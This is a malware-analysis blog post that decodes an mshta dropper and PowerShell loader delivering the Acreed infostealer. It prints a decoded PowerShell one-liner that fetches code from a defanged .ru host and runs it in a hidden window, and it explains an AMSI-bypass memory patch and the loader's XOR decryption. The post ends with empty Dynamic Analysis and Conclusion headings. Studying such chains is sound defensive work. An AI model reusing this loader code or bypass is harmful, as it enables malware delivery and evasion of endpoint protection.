---
layout: post
title:  "EtherHiding Dropping Acreed Infostealer - Full Malware Analysis"
date:   2025-09-16 21:00:00 +1000
categories: malware analysis
---

<style>
  body { font-size: 16px; }
  body {font-family: 'Inter', sans-serif}
  h1 { font-size: 19px !important; }
  h2 { font-size: 17px !important; }
  h3 { font-size: 15px !important; }
</style>

## Overview

Here we will be analysisng some malware that kicked off from an execution chain from a Clickfix payload.

I thought LummaStealer was difficult. This one is ridicolous.

I will preface my determinations that this is Acreed has been determined by OSINT on the domains and eth contracts that we're used during staging. 

Peep the end for a malware devs OPSec error.

## Dropper 

``mshta hXXps://gb[.]kaq51[.]ru/m54tdry4``

Okay, when safely pulled with my jank script we get about 2.5mbs of bits and bytes. 

![alt text](/images/mal_first.PNG)
- First can a command to move open mshta cmd window to (-99,0) on the screen, which is the bottom left. Likely to avoid suspicion?
- Next we can see an ``ELF`` file header and a Linux OS? Perhaps this is an embedded linux file. I can try to rebuild it cause we have the bytes!
- Last we have a script open up with some obfuscated VB code? What a throwback.

What's really interesting is the file opens ``script`` encapsulates the .elf file in it then closes ``script``. Really cool.

I tried to rebuild the .elf file in a Linux VM but cannot get it right, probably a character or a space off the right bits and bytes. I'll leave it. I reckon further down the line the code will call it and give the opportunity for us to dump it successfully.

![alt text](/images/vbs.PNG)

Looks like we have some hex strings here, I'm seeing this throughout the code, so I'll go through and convert every hex string I spot.

![alt text](/images/unobfuscted_first.PNG)

Now we can see a bit better, here what this function does.
1. Parses in the variable ``thkiaqvpzab``
2. Declares variables
3. Creates a WMI object
4. Connects to WMI service on machine
5. Gets the ProcessStartup class. This allows for process creation and management using WMI.
6. Sets the configuration of the WMI service to the variable ``nrhfhprneb`` with three flags. Configuration of WMI Object (``aihoizxpjk``), window size (``aihoizxpjk``) and an unknown variable of that passed in variable ``thkiaqvpzab``

Essentially the function uses WMI to spawn a hidden process. And, we are after what is passed to the function ``nrhfhprneb`` because that is likely a command/script.

![alt text](/images/second_part.PNG)

Now this pieces together the puzzle, this function creates the new process with the startup settings passed in from our previous function. 

![alt text](/images/next.PNG)

This stinks of our payload. Looks like Hex --> B64 --> Plaintext?

![alt text](/images/cyberchef_first.PNG)

Bingo. But that last part still looks like B64.

This hex string pattern occurs for about 60 more lines. So I'll Ctrl+H in Notepad++ and replace all instances of `eanjxdqwjegyor` and `ftekumdnoycycubr` with a null value, along with the brackets, equals and quotations.

![alt text](/images/payload_hex.PNG)

Cool now I'll whack this into CyberChef and see what we get. Decoding with Hex --> B64

![alt text](/images/hex_b64.PNG)

And then with the B64 left over. I'll copy/paste to a new input tab and decode that with B64

![alt text](/images/b64_decode.PNG)

Alright this still looks obfuscated. Let me copy/paste to notepad++ and see what I'm dealing with

![alt text](/images/weird_string.PNG)
![alt text](/images/encoded.PNG)

Looks like inline encoding. What we have is a big old string. And the decoding function at the end of the string. Looks complicated. But we have it there in our faces. So time to whip out CyberChef again, I'm baking a payload. 

In order we need to:
1. Replace all ! with 4s
2. Replace all > with 5s

![alt text](/images/baking.PNG)

Now that looks like hex to me. Lets decode from hex.

![alt text](/images/b64_still.PNG)

Now that looks like b64. Cmon surely this is it!

![alt text](/images/woohoo.PNG)

Bingo. How fun is decoding stuff.

``$È=New-Object System.Diagnostics.ProcessStartInfo;$È.FileName=($env:WINDIR+([char]92)+'SysWOW64'+[char]92+'WindowsPowerShell'+[char]92+'v1.0'+[char]92+'powershell.exe');$sub=-join(97..122|random -c(random -mi 3 -ma 6)|%{[char]$_});$È.Arguments='-Exec Unrestricted -Wind Hid -Comm "SV U ([Net.WebClient]::New());Set-Item Variable:/URM ''hXXp://'+$sub+'[.]ci6ef[.]ru/sinkers'';(LS Variable:U).Value.(((([Net.WebClient]::New()|Member)|Where{(GV _ -Valu).Name-ilike''*wn*d*g''}).Name))((Get-Variable URM).Value)|&(GCI Alias:\*EX)"';$È.UseShellExecute=$false;$È.CreateNoWindow=$true;$È.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden;[System.Diagnostics.Process]::Start($È)``

So what we can see is it using ``WebClient.DownloadString`` to download something at the domain ``hXXp://'+$sub+'[.]ci6ef[.]ru/sinkers`` and run it using ``Invoke-Expression``

Wow, how cool is $sub. So the PowerShell randomly generates a string for the $sub variable that is then passed into the domain ``hXXp://'+$sub+'[.]ci6ef[.]ru/sinkers``

``$sub=-join(97..122|random -c(random -mi 3 -ma 6)|%{[char]$_})``
- Anything between 3 and 6 characters in size is accepted
- Between 97..122 in ASCII (so a-z)

So back to my jank script to pull down the loader, I'll try ``hXXp://abc[.]ci6ef[.]ru/sinkers``. 

![alt text](/images/pull.PNG)
![alt text](/images/down.PNG)

Well it looks down. Getting 404s and no nslookup entry.

I'll repull a fresh sample of the dropper, and hopefully it has a new domain in there. Skip to "Loader" section to pick up from here.

### Further Dropper Analysis

![alt text](/images/decoded.PNG)

We have a powershell call and about 400 characters of more B64.

![alt text](/images/decoded_b64.PNG)

When I decode that B64 we can see a bit better, but still not great. All the data lives in the variable ``JzkRs``. 

I have no idea what those bits and bytes are. 

Zooming out I can see the value of all these encoded bits and bytes are passed to the variable ``rbeqwxctrp`` which is called later on in the script. So I will park this here for now. I reckon we will be able to dump it easier later.

![alt text](/images/error.PNG)

Looks some type of error handling script. I will say this now, this obfuscation is unique. However, the naming convention of the functions is identical to the last LummaStealer sample I manually analysed, so my money is on Lumma!

![alt text](/images/next_variable.PNG)

The function ``ozybymuzpian`` calls the function ``rbeqwxctrp`` which was used to store all the bits and bytes from the encoded hex --> b64 strings we observed above.

Then sets a value for the variable ``nfaupnpmtf`` to the output of the function ``pfikjr`` with a passed in parameter of ``poahoksthybhusnasu``. We have yet to have a look at the function ``pfikjr`` but will soon. This is getting good.

Now this is interesting. AutoOpen() is a macro used for Word/Excel. So perhaps, the malware opens an embedded word/excel document with a macro in it? AutoOpen() calls in ``ozybymuzpian``

![alt text](/images/third_function.PNG)

I'm not sure about this function. Really got no idea. May circle back.

![alt text](/images/fourth_function.PNG)

## Loader

Hell yea, mission success.

![alt text](/images/size.PNG)
![alt text](/images/size2.PNG)

This file is huge, I feel like I'm being trolled (clearly). I have no idea how I'm going to go through this. First though is AI but no model is accepting this input. Perhaps I can run a pattern matching algorithm over it? ML or something to flag anomalies. My static analysis journey is now under serious question.

Scrap that this is easy.

![alt text](/images/obfu_method.PNG)
What this is doing is setting the value of the variable ``VYesPp`` to the character conversion of the value of the variables. This is converting a number to a character. That number is stored in the variables. So we need to find the value of the variables that combine to make the value of ``VYesPp``. Or we could just print it, but that's no fun! So I'll do it the long way for this one, let's do ``qyWuQbjO``

![alt text](/images/value.PNG)
Alright this was almost easy. But there are some more values to chase down that are stored in those other variables that combine to equal ``qyWuQbjO``. So scrap that, not important to manually do this as we can print it unencoded once we understand the flow better.

Note the ``$hexafoil`` variable. Looks to contain a bunch of raw bytes. So is likely our payload.

![alt text](/images/b64_somehow.PNG)
Cyberchef shows B64 encoded. When I further decode from B64 no luck, we are still a while away by the looks.

![alt text](/images/formatted.PNG)
I've formatted the code below ``hexafoil`` and it paints a clearer picture as to what is going on.

![alt text](/images/golkv.PNG)
Let's start with decoding the value of this variable.

![alt text](/images/printed.PNG)
I've removed the dodgy code below, taken a snapshot just in case, disconnected from internet and appended as the last line of the code ``Write-Host($VYesPp)`` to print the value. I'll do the same for the following variables and list below
- ``$VYesPp`` = System.Text.Encoding
- ``$KlmoMwn`` = UTF8
- ``$OcgMhVmuJPe`` = GetBytes

So now unencrypted we have = ``$golKv = (System.Text.Encoding -as [Type])::UTF8.GetBytes("$emprosthotonic")``
- Takes the string in ``$emprosthotonic`` and converts it to a byte array and stores it in $golKv (this reeks of a key)

So let's just change it to ``Write-Host($emprosthotonic))`` to print the value of it to CLI.
![alt text](/images/AMSI.PNG)
"AMSI_RESULT_NOT_DETECTED" suggests that ``$emprosthotonic`` ran something to determine whether ASMI was able to perhaps be bypassed? 

![alt text](/images/empro.PNG)
Quick check confirms dynamic code was ran to determine the value of ``emprosthotonic``. Likley an ASMI bypass/check?

Anyhow. This is what it looks like ``$golKv = (System.Text.Encoding -as [Type])::UTF8.GetBytes("AMSI_RESULT_NOT_DETECTED")``

![alt text](/images/loop.PNG)
Pretty confident ``$golKv`` ("AMSI_RESULT_NOT_DETECTED") is a key. Can see it passed in later on during this loop craziness I've yet to look at.

![alt text](/images/no_ob.PNG)
Lets take a look at the first weird loopy thing. We can pass in some values of the variables earlier to make these more readable

![alt text](/images/half_deob.PNG)
Halfway there we will print the last variables.

- ``$IlfSA`` =  GetString
- ``$YJdlpgFmHeLxth`` = FromBase64String
- ``$knVotsG`` = System.Convert

![alt text](/images/de_ob_full.PNG)
Haha! This tells us to decode the value of ``$hexafoil``. Layered with a bit of crap. UTF8.GetString --> B64 --> UTF8.GetString --> UTF8.GetBytes
- This value is stored in ``$ZyscArvKNSUxgX`` as the UTF-8 bytes of the B64 payload.

![alt text](/images/cheddar.PNG)
We are getting to the cheddar now. Last blob to analyse. Let's start by replacing some of the jargon with the values we already know and the ones we don't.
- ``$EJFryleoaZihHn`` = Scriptblock
- ``$KGyjgcNQz`` = Create
- ``$fkuvnP`` = length
- ``$SyWzumJ`` = Invoke

![alt text](/images/cheddar_cheese.PNG)
Gee whiz we are close. This looks like an XOR function. Passes in our XOR key which we know is the value of ``$golKv`` and iterates through ``$hexafoil`` to decrypt the goodies.

Therefore, we know everything we need to know. Let's unbake this payload in our favourite commercial kitchen (CyberChef).

The decryption method from our raw bytes in ``$hexafoil`` is From Decimal (Comma) --> Decode UTF-8 --> From Base64 --> XOR (Key = "AMSI_RESULT_NOT_DETECTED")

![alt text](/images/we_have_code.PNG)
We have clear text code!! Finally. This is darn epic.

### Cleartext At Last

Well it looks like we've found the next stage of whatever on earth we are dealing with here. Also has comments explaining what the code does, making it easier for a lvl 0 soc analyst. No obfuscation either, how good.

Here's some of what I can see initially
- B64 string stored in ``$a``
- System.Reflection.Assembly
- Thread sleeping

Some Win32 APIs, suggesting process/memory modification.
- VirtualProtect
- VirtualQuery
- GetSystemInfo
- ReadProcessMemory
- WriteProcessMemory
- GetCurrentProcess

### AMSI Bypass

Wow, it looks like we have an AMSI reference here, perhaps an AMSI bypass?
![alt text](/images/signature.PNG)
- ``$signature`` stores "AmsiScanBuffer"

![alt text](/images/enumerate_mem_regions.PNG)
The function above is scanning through every allocated memory region collecting the following
- Base address
- Region size
- Protection flags
- Mapped file

![alt text](/images/readable.PNG)
This function checks what memory regions are readable/writeable. 

![alt text](/images/scanamsi.PNG)
This function is a bit of a mouthful. Essentially if a memory region belongs to ``crl.dll`` it is scanning it for the "AmsiScanBuffer" symbol stored in the ``$signature`` variable from earlier.

AMSI function are compiled into CRL memory, hence why it is only checking ``crl.dll`.

![alt text](/images/patch.PNG)
This function seals the deal. After a hit for "AmsiScanBuffer" is found the function makes the memory address writable. Then overwrites the memory object with null bytes, thus corrupting the function. 

Note this won't crash AmsiScanBuffer it just breaks calls into it, as it points to null bytes, therefore, doing nothing.

Lastly it restores old memory protection, thus making it not writable again.

### Reflective .NET Loader

Okay we have our B64 string that we will decode below. However, lets determine how this is passed in to memory. 

![alt text](/images/load.PNG)
- Loads the bytes into memory
- Grabs metadata allowing it to be invoked at a later date

![alt text](/images/goodies.PNG)
I'm going to be straight up. I can't wrap my head around what is happening in the above function.

However, I know we have a loader that is taking the unencoded B64 string and running it in memory inside PowerShell, without creating a new process. 

Furthermore, showing sopshitication through evading strings EDRs commonly hook such as:
- ``System.Reflection.Assembly Load(byte[])`` instead of ``[System.Reflection.Assembly]::Load()``

### B64 String

Let's unobfuscate the B64 string stored in ``$a``

``$bytes = [System.Convert]::FromBase64String($a) [IO.File]::WriteAllBytes("output.bin", $bytes)``
- This dumps the value of ``$bytes`` into "output.bin"

Sweet we have 1.2mbs of goodies. Here are the hashes.
- MD5 ``022611e6ffcb30ae62a27c5009d528d7``
- SHA256 ``006f0054609064c00d3d217ee37f924b4cf8c4fabde362408cdec1446d719913``

### Payload

![alt text](/images/DiE_result.PNG)
Detect it Easy result. 
- Signature = ``(Heur) Protection: Obfuscation [Modified EP + CLR constructor + Strange EP position + Virtualization + Calls encrypt + Anti-ILDASM + Ctrl flow + Fake .cctor name + Math mutations + Watermark]``

![alt text](/images/vt_yep.PNG)
Boy oh boy. What have we got here. No initial OSINT attributes it to a certain type of malware unfortunately.

Lets run my strings IOC script over it and see what we can find. No hits, that hurts the ego. Looks like C2 domains and the juicy stuff is further encrypted as suggested by the signature in DiE. 

Here's what I picked out of strings when I ran normally: 

``D:\Keppy\Desktop\issrc-arm64\issrc-arm64\Examples\MyProg\xARM64\Debug\MyProg.pdb``
- Wow this is revealing. Shows the devs windows profile name was "Keppy". This is a big time OPSec error. Can't find anything anywhere attributing 'Keppy'. This is a great find.
``(This EXE was compiled for the ARM64 architecture.)``
- ARM64 malware? Quite uncommon, cool stuff. Did see a post a while back on Dread about why no one builds ARM64 malware, now they do I guess.
``Unizeto Technologies S.A.1``
- Polish PKI and signature service. Acreed Russian based. Similar geographical position.
``ProtoGen2.3.0.277``
- ProtoBuf-net is used 
``\u0093\u0094\u009A``
- Unicode-name obfuscation.
``m_de53635982c949d7a12e56c706211ac1``
- ConfuserEx mutuated string decryptor method.
``acr-GETWELL-3ftrxv1z.p51_.exe``
- Auto generated assembly name. Looks obfuscated with a pattern. The "acr" at the start is a common naming convention for Acreed infostealer. Furthermore, the "GETWELL" is also cool could be campaign related.

## Dynamic Analysis

## Conclusion
